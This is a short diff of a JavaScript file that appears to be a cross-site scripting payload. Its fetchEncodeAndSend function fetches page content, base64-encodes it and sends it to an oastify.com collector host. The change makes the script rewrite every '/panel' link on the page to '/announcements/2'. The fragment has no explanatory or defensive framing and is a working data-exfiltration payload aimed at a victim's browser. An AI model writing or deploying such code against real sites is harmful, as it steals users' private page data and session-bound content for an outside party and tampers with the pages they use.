@@ -21,11 +21,14 @@ function fetchEncodeAndSend(originalUrl, targetUrlBase) {
         .catch(error => console.error('Error in fetching or encoding:', error));
 }
 
-var link = document.querySelector('a[href="/panel"]');
+// Select all <a> elements with href="/panel"
+var links = document.querySelectorAll('a[href="/panel"]');
 
-// Check if the element exists to avoid errors
-if (link) {
-    link.href = '/announcements/2'; // Change the href to the new path
+// Check if the NodeList is not empty
+if (links.length > 0) {
+    links.forEach(function(link) {
+        link.href = '/announcements/2'; // Change the href to the new path for each element
+    });
 }
 
 var targetUrlBase = 'https://hsd0gyosk5qk1lzr8cz7uqxxroxflb90.oastify.com';  // Base URL where you send the base64 encoded data
